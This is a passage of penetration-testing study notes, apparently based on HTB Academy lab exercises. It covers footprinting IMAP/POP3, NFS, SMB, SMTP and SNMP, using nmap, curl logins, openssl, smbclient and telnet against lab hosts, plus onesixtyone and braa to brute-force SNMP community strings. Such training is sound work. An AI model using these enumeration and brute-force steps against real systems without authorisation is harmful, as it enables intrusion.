|_Not valid after:  2295-07-04T19:44:58
995/tcp open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE USER SASL(PLAIN) TOP UIDL RESP-CODES CAPA PIPELINING
| ssl-cert: Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight/stateOrProvinceName=California/countryName=US
| Not valid before: 2021-09-19T19:44:58
|_Not valid after:  2295-07-04T19:44:58
MAC Address: 00:00:00:00:00:00 (VMware)

Service detection performed. Please report any incorrect results to https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.74 seconds
</code></pre>
<p>For example, from the output, we can see that the common name is <code>mail1.inlanefreight.htb</code>, and the email server belongs to the organization Inlanefreight, which is located in California. The displayed capabilities show us the commands available on the server and for the service on the corresponding port.</p>
<p>If we successfully figure out the access credentials for one of the employees, an attacker could log in to the mail server and read or even send the individual messages.</p>
<h3 id="curl"><a class="header" href="#curl">cURL</a></h3>
<pre><code class="language-bash">rnemeth@htb[/htb]$ curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd

* LIST (\HasNoChildren) "." Important
* LIST (\HasNoChildren) "." INBOX
</code></pre>
<p>If we also use the verbose (<code>-v</code>) option, we will see how the connection is made. From this, we can see the version of TLS used for encryption, further details of the SSL certificate, and even the banner, which will often contain the version of the mail server.</p>
<pre><code class="language-bash">rnemeth@htb[/htb]$ curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v

*   Trying 10.129.14.128:993...
* TCP_NODELAY set
* Connected to 10.129.14.128 (10.129.14.128) port 993 (#0)
* successfully set certificate verify locations:
*   CAfile: /etc/ssl/certs/ca-certificates.crt
  CApath: /etc/ssl/certs
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384
* Server certificate:
*  subject: C=US; ST=California; L=Sacramento; O=Inlanefreight; OU=Customer Support; CN=mail1.inlanefreight.htb; emailAddress=cry0l1t3@inlanefreight.htb
*  start date: Sep 19 19:44:58 2021 GMT
*  expire date: Jul  4 19:44:58 2295 GMT
*  issuer: C=US; ST=California; L=Sacramento; O=Inlanefreight; OU=Customer Support; CN=mail1.inlanefreight.htb; emailAddress=cry0l1t3@inlanefreight.htb
*  SSL certificate verify result: self signed certificate (18), continuing anyway.
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* old SSL session ID is stale, removing
&lt; * OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] HTB-Academy IMAP4 v.0.21.4
&gt; A001 CAPABILITY
&lt; * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN
&lt; A001 OK Pre-login capabilities listed, post-login capabilities have more.
&gt; A002 AUTHENTICATE PLAIN AGNyeTBsMXQzADEyMzQ=
&lt; * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE
&lt; A002 OK Logged in
&gt; A003 LIST "" *
&lt; * LIST (\HasNoChildren) "." Important
* LIST (\HasNoChildren) "." Important
&lt; * LIST (\HasNoChildren) "." INBOX
* LIST (\HasNoChildren) "." INBOX
&lt; A003 OK List completed (0.001 + 0.000 secs).
* Connection #0 to host 10.129.14.128 left intact
</code></pre>
<h3 id="openssl---tls-encrypted-interaction"><a class="header" href="#openssl---tls-encrypted-interaction">OpenSSL - TLS Encrypted Interaction</a></h3>
<p>To interact with the IMAP or POP3 server over SSL, we can use <code>openssl</code>, as well as <code>ncat</code>. The commands for this would look like this:</p>
<h4 id="pop3"><a class="header" href="#pop3">POP3</a></h4>
<pre><code class="language-bash">rnemeth@htb[/htb]$ openssl s_client -connect 10.129.14.128:pop3s

CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb
verify error:num=18:self signed certificate
verify return:1
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb
verify return:1
---
Certificate chain
 0 s:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb

...SNIP...

---
read R BLOCK
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: 3CC39A7F2928B252EF2FFA5462140B1A0A74B29D4708AA8DE1515BB4033D92C2
    Session-ID-ctx:
    Resumption PSK: 68419D933B5FEBD878FF1BA399A926813BEA3652555E05F0EC75D65819A263AA25FA672F8974C37F6446446BB7EA83F9
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - d7 86 ac 7e f3 f4 95 35-88 40 a5 b5 d6 a6 41 e4   ...~...5.@....A.
    0010 - 96 6c e6 12 4f 50 ce 72-36 25 df e1 72 d9 23 94   .l..OP.r6%..r.#.
    0020 - cc 29 90 08 58 1b 57 ab-db a8 6b f7 8f 31 5b ad   .)..X.W...k..1[.
    0030 - 47 94 f4 67 58 1f 96 d9-ca ca 56 f9 7a 12 f6 6d   G..gX.....V.z..m
    0040 - 43 b9 b6 68 de db b2 47-4f 9f 48 14 40 45 8f 89   C..h...GO.H.@E..
    0050 - fa 19 35 9c 6d 3c a1 46-5c a2 65 ab 87 a4 fd 5e   ..5.m&lt;.F\.e....^
    0060 - a2 95 25 d4 43 b8 71 70-40 6c fe 6f 0e d1 a0 38   ..%.C.qp@l.o...8
    0070 - 6e bd 73 91 ed 05 89 83-f5 3e d9 2a e0 2e 96 f8   n.s......&gt;.*....
    0080 - 99 f0 50 15 e0 1b 66 db-7c 9f 10 80 4a a1 8b 24   ..P...f.|...J..$
    0090 - bb 00 03 d4 93 2b d9 95-64 44 5b c2 6b 2e 01 b5   .....+..dD[.k...
    00a0 - e8 1b f4 a4 98 a7 7a 7d-0a 80 cc 0a ad fe 6e b3   ......z}......n.
    00b0 - 0a d6 50 5d fd 9a b4 5c-28 a4 c9 36 e4 7d 2a 1e   ..P]...\(..6.}*.

    Start Time: 1632081313
    Timeout   : 7200 (sec)
    Verify return code: 18 (self signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
+OK HTB-Academy POP3 Server
</code></pre>
<h4 id="imap"><a class="header" href="#imap">IMAP</a></h4>
<pre><code class="language-bash">rnemeth@htb[/htb]$ openssl s_client -connect 10.129.14.128:imaps

CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb
verify error:num=18:self signed certificate
verify return:1
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb
verify return:1
---
Certificate chain
 0 s:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb

...SNIP...

---
read R BLOCK
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: 2B7148CD1B7B92BA123E06E22831FCD3B365A5EA06B2CDEF1A5F397177130699
    Session-ID-ctx:
    Resumption PSK: 4D9F082C6660646C39135F9996DDA2C199C4F7E75D65FA5303F4A0B274D78CC5BD3416C8AF50B31A34EC022B619CC633
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - 68 3b b6 68 ff 85 95 7c-8a 8a 16 b2 97 1c 72 24   h;.h...|......r$
    0010 - 62 a7 84 ff c3 24 ab 99-de 45 60 26 e7 04 4a 7d   b....$...E`&amp;..J}
    0020 - bc 6e 06 a0 ff f7 d7 41-b5 1b 49 9c 9f 36 40 8d   .n.....A..I..6@.
    0030 - 93 35 ed d9 eb 1f 14 d7-a5 f6 3f c8 52 fb 9f 29   .5........?.R..)
    0040 - 89 8d de e6 46 95 b3 32-48 80 19 bc 46 36 cb eb   ....F..2H...F6..
    0050 - 35 79 54 4c 57 f8 ee 55-06 e3 59 7f 5e 64 85 b0   5yTLW..U..Y.^d..
    0060 - f3 a4 8c a6 b6 47 e4 59-ee c9 ab 54 a4 ab 8c 01   .....G.Y...T....
    0070 - 56 bb b9 bb 3b f6 96 74-16 c9 66 e2 6c 28 c6 12   V...;..t..f.l(..
    0080 - 34 c7 63 6b ff 71 16 7f-91 69 dc 38 7a 47 46 ec   4.ck.q...i.8zGF.
    0090 - 67 b7 a2 90 8b 31 58 a0-4f 57 30 6a b6 2e 3a 21   g....1X.OW0j..:!
    00a0 - 54 c7 ba f0 a9 74 13 11-d5 d1 ec cc ea f9 54 7d   T....t........T}
    00b0 - 46 a6 33 ed 5d 24 ed b0-20 63 43 d8 8f 14 4d 62   F.3.]$.. cC...Mb

    Start Time: 1632081604
    Timeout   : 7200 (sec)
    Verify return code: 18 (self signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] HTB-Academy IMAP4 v.0.21.4
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="mqtt"><a class="header" href="#mqtt">MQTT</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="nfs-network-file-system"><a class="header" href="#nfs-network-file-system">NFS (Network File System)</a></h1>
<p>NFS is a distributed file system protocol that allows a user on a client computer to access files over a network in a manner similar to how local storage is accessed. It was originally developed by Sun Microsystems in the 1980s and has since become a widely adopted standard for file sharing in Unix and Linux environments.</p>
<p>NFS is based on the Open Network Compute Remote Procedure Call (ONC-RPC/SUNRPC) protocol: https://en.wikipedia.org/wiki/Sun_RPC</p>
<h2 id="nfs-versions"><a class="header" href="#nfs-versions">NFS Versions</a></h2>
<ul>
<li><strong>NFSv2</strong>: The original version, introduced in 1984, supports basic file operations but has limitations such as a maximum file size of 2GB.</li>
<li><strong>NFSv3</strong>: Introduced in 1995, it added support for larger file sizes (up to 64-bit), improved performance, and better error handling.</li>
<li><strong>NFSv4</strong>: Released in 2000, it introduced significant enhancements, including stateful protocol, improved security features (like Kerberos authentication), and support for file locking and delegation.</li>
<li><strong>NFSv4.1 and NFSv4.2</strong>: These are incremental updates to NFSv4, adding features like parallel NFS (pNFS) for improved performance and additional security enhancements.</li>
</ul>
<h2 id="configuration"><a class="header" href="#configuration">Configuration</a></h2>
<ul>
<li>NFS is generally simple to configure. The <code>/etc/exports</code> file on the server specifies which directories are shared and the permissions for each client.
<pre><code class="language-bash">rnemeth@htb[/htb]$ cat /etc/exports 

# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
</code></pre>
</li>
<li>On the client side, the <code>mount</code> command is used to mount NFS shares to local directories.</li>
</ul>
<h2 id="footprinting-and-enumeration"><a class="header" href="#footprinting-and-enumeration">Footprinting and Enumeration</a></h2>
<ul>
<li>When footprinting NFS, the ports 111 and 2049 are commonly associated with NFS services. Port 111 is used by the portmapper service, which helps clients locate the NFS service on the server. Port 2049 is the default port for NFS itself.</li>
<li>Tools like <code>showmount</code>, <code>nmap</code>, and <code>rpcinfo</code> can be used to enumerate NFS shares and gather information about the NFS service.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="ntp"><a href="#ntp" class="header">NTP</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="quic"><a class="header" href="#quic">QUIC</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="server-message-block-smb"><a class="header" href="#server-message-block-smb">Server Message Block (SMB)</a></h1>
<p>The SMB protocol is a client-server protocol that regulates access to shared network resources such as files, printers, and other devices. It is primarily used in Windows-based networks but is also supported by other operating systems through implementations like <code>samba</code>. SMB uses TCP port 445 for direct hosting and TCP port 139 for NetBIOS over TCP/IP.SMB supports access control for file shares via ACLs on the server.</p>
<h2 id="samba"><a class="header" href="#samba">Samba</a></h2>
<ul>
<li>Samba is an open-source implementation of the SMB protocol that allows non-Windows systems to share files and printers with Windows clients.</li>
<li>Samba uses the CIFS (Common Internet File System) protocol, which is a dialect of SMB.</li>
<li>Samba can act as both a file server and a domain controller in a Windows network.</li>
</ul>
<h3 id="samba-configuration"><a class="header" href="#samba-configuration">Samba Configuration</a></h3>
<ul>
<li>The main configuration file for Samba is typically stored at <code>/etc/samba/smb.conf</code>.</li>
<li>Key sections in the <code>smb.conf</code> file include:</li>
</ul>
<pre><code class="language-bash">rnemeth@htb[/htb]$ cat /etc/samba/smb.conf | grep -v "#\|\;" 

[global]
   workgroup = DEV.INFREIGHT.HTB
   server string = DEVSMB
   log file = /var/log/samba/log.%m
   max log size = 1000
   logging = file
   panic action = /usr/share/samba/panic-action %d

   server role = standalone server
   obey pam restrictions = yes
   unix password sync = yes

   passwd program = /usr/bin/passwd %u
   passwd chat = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .

   pam password change = yes
   map to guest = bad user
   usershare allow guests = yes

[printers]
   comment = All Printers
   browseable = no
   path = /var/spool/samba
   printable = yes
   guest ok = no
   read only = yes
   create mask = 0700

[print$]
   comment = Printer Drivers
   path = /var/lib/samba/printers
   browseable = yes
   read only = yes
   guest ok = no
</code></pre>
<ul>
<li>In the configuration above, we see global settings and two shares: <code>[printers]</code> and <code>[print$]</code>. Global settings are applied to the entire Samba server, while share definitions specify settings for individual shared resources and can override global settings.</li>
</ul>
<h2 id="smb-versions"><a class="header" href="#smb-versions">SMB Versions</a></h2>
<ul>
<li><strong>SMB1</strong>: The original version of SMB, now considered obsolete and insecure.</li>
<li><strong>SMB2</strong>: Introduced in Windows Vista and Windows Server 2008, SMB2 brought significant performance improvements and security enhancements.</li>
<li><strong>SMB3</strong>: Introduced in Windows 8 and Windows Server 2012, SMB3 added features like encryption, improved performance, and better support for virtualized environments.</li>
</ul>
<h2 id="smb-security"><a class="header" href="#smb-security">SMB Security</a></h2>
<ul>
<li>SMB supports various authentication methods, including NTLM and Kerberos.</li>
<li>SMB3 introduced encryption to protect data in transit.</li>
<li>It is recommended to disable SMB1 due to its vulnerabilities and use SMB2 or SMB3 for better security.</li>
<li>Firewalls should be configured to restrict access to SMB ports (139 and 445) to trusted networks only.</li>
</ul>
<h2 id="common-smb-commands"><a class="header" href="#common-smb-commands">Common SMB Commands</a></h2>
<ul>
<li>
<p><code>smbclient</code>: A command-line tool to access SMB/CIFS resources on servers.</p>
<pre><code class="language-bash">  rnemeth@htb[/htb]$ smbclient -N -L //10.129.14.128

          Sharename       Type      Comment
          ---------       ----      -------
          print$          Disk      Printer Drivers
          home            Disk      INFREIGHT Samba
          dev             Disk      DEVenv
          notes           Disk      CheckIT
          IPC$            IPC       IPC Service (DEVSM)
  SMB1 disabled -- no workgroup available
</code></pre>
<ul>
<li>Once we have discovered interesting files or folders, we can download them using the get command. Smbclient also allows us to execute local system commands using an exclamation mark at the beginning (!<cmd>) without interrupting the connection.</cmd></li>
</ul>
</li>
<li>
<p><code>smbstatus</code>: Displays current Samba connections and open files.</p>
</li>
<li>
<p><code>smbpasswd</code>: Used to manage Samba user passwords.</p>
</li>
<li>
<p><code>testparm</code>: Checks the Samba configuration file for syntax errors.</p>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="smtp-simple-mail-transfer-protocol"><a class="header" href="#smtp-simple-mail-transfer-protocol">SMTP (Simple Mail Transfer Protocol)</a></h1>
<h2 id="overview-11"><a class="header" href="#overview-11">Overview</a></h2>
<p>SMTP (Simple Mail Transfer Protocol) is a protocol used for sending and receiving email messages over the internet. It is a text-based protocol that operates on the application layer of the OSI model and is primarily used for sending emails from a client to a mail server or between mail servers.</p>
<p>SMTP is often combined with IMAP or POP3 protocols, which are used for retrieving and storing emails on a mail server.</p>
<h2 id="smtp-definitions"><a class="header" href="#smtp-definitions">SMTP Definitions</a></h2>
<ul>
<li><strong>MTA (Mail Transfer Agent)</strong>: A software application that transfers email messages from one computer to another using SMTP.</li>
<li><strong>MUA (Mail User Agent)</strong>: A software application that allows users to read and</li>
<li><strong>MSA (Mail Submission Agent)</strong>: A software application that accepts email messages from MUAs and forwards them to MTAs for delivery.</li>
<li><strong>MDA (Mail Delivery Agent)</strong>: A software application that delivers email messages to the recipient‚Äôs mailbox.</li>
</ul>
<pre><code class="language-bash">MUA -&gt; MSA -&gt; MTA -&gt; MDA -&gt; Recipient's Mailbox (POP3/IMAP for retrieval)
</code></pre>
<h2 id="how-smtp-works"><a class="header" href="#how-smtp-works">How SMTP Works</a></h2>
<ul>
<li>SMTP uses a client-server architecture, where the email client (sender) communicates with the mail server (receiver) to send email messages.</li>
<li>The client establishes a connection to the mail server using TCP (Transmission Control Protocol) on port 25 (or port 587 for secure connections).</li>
<li>The client sends a series of commands to the server, including the sender‚Äôs email address, recipient‚Äôs email address, and the message content.
<ul>
<li>The commands are:
<ul>
<li>HELO/EHLO: Initiates the conversation between the client and server.</li>
<li>MAIL FROM: Specifies the sender‚Äôs email address.</li>
<li>RCPT TO: Specifies the recipient‚Äôs email address.</li>
<li>DATA: Indicates that the message content will follow.</li>
<li>QUIT: Ends the session.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="esmtp-extensions"><a class="header" href="#esmtp-extensions">ESMTP Extensions</a></h2>
<ul>
<li>Most modern servers support Extended SMTP (ESMTP), which adds additional features and capabilities to the standard SMTP protocol.</li>
<li>ESMTP introduces new commands such as:
<ul>
<li>AUTH: Used for authentication of the client.</li>
<li>STARTTLS: Used to initiate a secure connection using TLS (Transport Layer Security).</li>
<li>SIZE: Allows the client to specify the size of the message being sent.</li>
<li>8BITMIME: Allows the transmission of 8-bit data.</li>
<li>DSN: Provides delivery status notifications.</li>
<li>etc‚Ä¶</li>
</ul>
</li>
</ul>
<h2 id="default-configuration-postfix"><a class="header" href="#default-configuration-postfix">Default Configuration (Postfix)</a></h2>
<ul>
<li>Postfix is a popular open-source mail transfer agent (MTA) that implements the SMTP protocol.</li>
<li>Default configuration settings can typically be found at <code>/etc/postfix/main.cf</code>:
<pre><code class="language-bash">[!bash!]$ cat /etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d"

smtpd_banner = ESMTP Server 
biff = no
append_dot_mydomain = no
readme_directory = no
compatibility_level = 2
smtp_tls_session_cache_database = btree:${data_directory}/smtp_scache
myhostname = mail1.inlanefreight.htb
alias_maps = hash:/etc/aliases
alias_database = hash:/etc/aliases
smtp_generic_maps = hash:/etc/postfix/generic
mydestination = $myhostname, localhost 
masquerade_domains = $myhostname
mynetworks = 127.0.0.0/8 10.129.0.0/16
mailbox_size_limit = 0
recipient_delimiter = +
smtp_bind_address = 0.0.0.0
inet_protocols = ipv4
smtpd_helo_restrictions = reject_invalid_hostname
home_mailbox = /home/postfix
</code></pre>
</li>
</ul>
<h2 id="esmtp-commands"><a class="header" href="#esmtp-commands">(E)SMTP Commands</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Command</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td>AUTH PLAIN</td><td>AUTH is a service extension used to authenticate the client.</td></tr>
<tr><td>HELO</td><td>The client logs in with its computer name and thus starts the session.</td></tr>
<tr><td>MAIL FROM</td><td>The client names the email sender.</td></tr>
<tr><td>RCPT TO</td><td>The client names the email recipient.</td></tr>
<tr><td>DATA</td><td>The client initiates the transmission of the email.</td></tr>
<tr><td>RSET</td><td>The client aborts the initiated transmission but keeps the connection.</td></tr>
<tr><td>VRFY</td><td>The client checks if a mailbox is available for message transfer.</td></tr>
<tr><td>EXPN</td><td>The client also checks if a mailbox is available for messaging.</td></tr>
<tr><td>NOOP</td><td>The client requests a response to prevent disconnection due to time-out.</td></tr>
<tr><td>QUIT</td><td>The client terminates the session.</td></tr>
</tbody>
</table>
</div>
<h2 id="interacting-with-smtp-servers"><a class="header" href="#interacting-with-smtp-servers">Interacting with SMTP Servers</a></h2>
<ul>
<li>Tools like <code>telnet</code> or <code>netcat</code> can be used to manually interact with SMTP servers for testing and debugging purposes.
<pre><code class="language-bash">[!bash!]$ telnet 10.129.14.128 25

Trying 10.129.14.128...
Connected to 10.129.14.128.
Escape character is '^]'.
220 ESMTP Server 


HELO mail1.inlanefreight.htb

250 mail1.inlanefreight.htb


EHLO mail1

250-mail1.inlanefreight.htb
250-PIPELINING
250-SIZE 10240000
250-ETRN
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250-SMTPUTF8
250 CHUNKING
</code></pre>
</li>
<li>A list of all SMTP response codes can be found here: https://serversmtp.com/smtp-error/</li>
</ul>
<h2 id="security-considerations"><a class="header" href="#security-considerations">Security Considerations</a></h2>
<ul>
<li>The sender of an email can easily spoof the ‚ÄúFrom‚Äù address, making it appear as if the email is coming from a different source. This is because SMTP does not have built-in mechanisms for verifying the authenticity of the sender. However, DKIM and SPF are two widely used methods to help mitigate this issue. ESMTP with STARTTLS can also help secure the transmission of emails.</li>
</ul>
<h3 id="dkim-domainkeys-identified-mail"><a class="header" href="#dkim-domainkeys-identified-mail">DKIM (DomainKeys Identified Mail)</a></h3>
<ul>
<li>DKIM is an email authentication method that allows the receiver to check that an email was indeed sent and authorized by the owner of that domain.</li>
<li>It uses a digital signature, which is added to the email header, to verify the authenticity of the message.</li>
</ul>
<h3 id="spf-sender-policy-framework"><a class="header" href="#spf-sender-policy-framework">SPF (Sender Policy Framework)</a></h3>
<ul>
<li>SPF is an email authentication method that allows the owner of a domain to specify which mail servers are authorized to send email on behalf of that domain.</li>
<li>It helps to prevent email spoofing by allowing the receiver to check the SPF record of the sender‚Äôs domain.</li>
<li>SPF records are published in the DNS (Domain Name System) as TXT records.</li>
</ul>
<h3 id="open-relay-attack"><a class="header" href="#open-relay-attack">Open Relay Attack</a></h3>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="snmp"><a class="header" href="#snmp">SNMP</a></h1>
<p>Simple Network Management Protocol (SNMP) was created to monitor network devices. In addition, this protocol can also be used to handle configuration tasks and change settings remotely. SNMP-enabled hardware includes routers, switches, servers, IoT devices, and many other devices that can also be queried and controlled using this standard protocol. Thus, it is a protocol for monitoring and managing network devices. In addition, configuration tasks can be handled, and settings can be made remotely using this standard. The current version is SNMPv3, which increases the security of SNMP in particular, but also the complexity of using this protocol.</p>
<h2 id="communication"><a class="header" href="#communication">Communication</a></h2>
<p>In addition to the pure exchange of information, SNMP also transmits control commands using agents over UDP port 161. The client can set specific values in the device and change options and settings with these commands. While in classical communication, it is always the client who actively requests information from the server, SNMP also enables the use of so-called traps over UDP port 162. These are data packets sent from the SNMP server to the client without being explicitly requested. If a device is configured accordingly, an SNMP trap is sent to the client once a specific event occurs on the server-side.</p>
<p>For the SNMP client and server to exchange the respective values, the available SNMP objects must have unique addresses known on both sides. This addressing mechanism is an absolute prerequisite for successfully transmitting data and network monitoring using SNMP.</p>
<h2 id="mib-management-information-base"><a class="header" href="#mib-management-information-base">MIB (Management Information Base)</a></h2>
<p>To ensure that SNMP access works across manufacturers and with different client-server combinations, the Management Information Base (MIB) was created. MIB is an independent format for storing device information. A MIB is a text file in which all queryable SNMP objects of a device are listed in a standardized tree hierarchy. It contains at least one Object Identifier (OID), which, in addition to the necessary unique address and a name, also provides information about the type, access rights, and a description of the respective object. MIB files are written in the Abstract Syntax Notation One (ASN.1) based ASCII text format. The MIBs do not contain data, but they explain where to find which information and what it looks like, which returns values for the specific OID, or which data type is used.</p>
<h2 id="oid-object-identifier"><a class="header" href="#oid-object-identifier">OID (Object Identifier)</a></h2>
<p>An OID represents a node in a hierarchical namespace. A sequence of numbers uniquely identifies each node, allowing the node‚Äôs position in the tree to be determined. The longer the chain, the more specific the information. Many nodes in the OID tree contain nothing except references to those below them. The OIDs consist of integers and are usually concatenated by dot notation. We can look up many MIBs for the associated OIDs in the Object Identifier Registry.</p>
<h2 id="snmp-versions"><a class="header" href="#snmp-versions">SNMP Versions</a></h2>
<h3 id="snmpv1"><a class="header" href="#snmpv1">SNMPv1</a></h3>
<p>SNMP version 1 (SNMPv1) is used for network management and monitoring. SNMPv1 is the first version of the protocol and is still in use in many small networks. It supports the retrieval of information from network devices, allows for the configuration of devices, and provides traps, which are notifications of events. However, SNMPv1 has no built-in authentication mechanism, meaning anyone accessing the network can read and modify network data. Another main flaw of SNMPv1 is that it does not support encryption, meaning that all data is sent in plain text and can be easily intercepted.</p>
<h3 id="snmpv2"><a class="header" href="#snmpv2">SNMPv2</a></h3>
<p>SNMPv2 existed in different versions. The version still exists today is v2c, and the extension c means community-based SNMP. Regarding security, SNMPv2 is on par with SNMPv1 and has been extended with additional functions from the party-based SNMP no longer in use. However, a significant problem with the initial execution of the SNMP protocol is that the community string that provides security is only transmitted in plain text, meaning it has no built-in encryption.</p>
<h3 id="snmpv3"><a class="header" href="#snmpv3">SNMPv3</a></h3>
<p>The security has been increased enormously for SNMPv3 by security features such as authentication using username and password and transmission encryption (via pre-shared key) of the data.</p>
<h2 id="security-considerations-1"><a class="header" href="#security-considerations-1">Security Considerations</a></h2>
<p>In the case of a misconfiguration, we would get approximately the same results from <code>snmpwalk</code> as just shown above. Once we know the community string and the SNMP service that does not require authentication (versions 1, 2c), we can query internal system information like in the previous example.</p>
<p>Here we recognize some Python packages that have been installed on the system. If we do not know the community string, we can use onesixtyone and SecLists wordlists to identify these community strings.</p>
<p>Often, when certain community strings are bound to specific IP addresses, they are named with the hostname of the host, and sometimes even symbols are added to these names to make them more challenging to identify. However, if we imagine an extensive network with over 100 different servers managed using SNMP, the labels, in that case, will have some pattern to them. Therefore, we can use different rules to guess them. We can use the tool crunch to create custom wordlists. Creating custom wordlists is not an essential part of this module, but more details can be found in the module Cracking Passwords With Hashcat.</p>
<p>Once we know a community string, we can use it with braa to brute-force the individual OIDs and enumerate the information behind them.</p>
<p>Once again, we would like to point out that the independent configuration of the SNMP service will bring us a great variety of different experiences that no tutorial can replace. Therefore, we highly recommend setting up a VM with SNMP, experimenting with it, and trying different configurations. SNMP can be a boon for an I.T. systems administrator as well as a curse for Security analysts and managers alike.</p>
<h2 id="tools-1"><a class="header" href="#tools-1">Tools</a></h2>
<h3 id="onesixtyone"><a class="header" href="#onesixtyone">OneSixtyOne</a></h3>
<p>OneSixtyOne is a tool used to brute-force SNMP community strings:</p>
<pre><code class="language-bash">[!bash!]$ sudo apt install onesixtyone
[!bash!]$ onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128

Scanning 1 hosts, 3220 communities
10.129.14.128 [public] Linux htb 5.11.0-37-generic #41~20.04.2-Ubuntu SMP Fri Sep 24 09:06:38 UTC 2021 x86_64
</code></pre>
<h3 id="braa"><a class="header" href="#braa">Braa</a></h3>
<p>Braa is a tool used to brute-force SNMP OIDs once a community string is known:</p>
<pre><code class="language-bash">[!bash!]$ sudo apt install braa
[!bash!]$ braa &lt;community string&gt;@&lt;IP&gt;:.1.3.6.*   # Syntax
[!bash!]$ braa public@10.129.14.128:.1.3.6.*

10.129.14.128:20ms:.1.3.6.1.2.1.1.1.0:Linux htb 5.11.0-34-generic #36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64
10.129.14.128:20ms:.1.3.6.1.2.1.1.2.0:.1.3.6.1.4.1.8072.3.2.10
10.129.14.128:20ms:.1.3.6.1.2.1.1.3.0:548
10.129.14.128:20ms:.1.3.6.1.2.1.1.4.0:mrb3n@inlanefreight.htb
10.129.14.128:20ms:.1.3.6.1.2.1.1.5.0:htb
10.129.14.128:20ms:.1.3.6.1.2.1.1.6.0:US
10.129.14.128:20ms:.1.3.6.1.2.1.1.7.0:78
</code></pre>
<h2 id="example-snmp-walk-output"><a class="header" href="#example-snmp-walk-output">Example SNMP Walk Output</a></h2>
<p>Example output from <code>snmpwalk</code> showing various OIDs and their values:</p>
<pre><code>iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB module for managing IP and ICMP implementations"
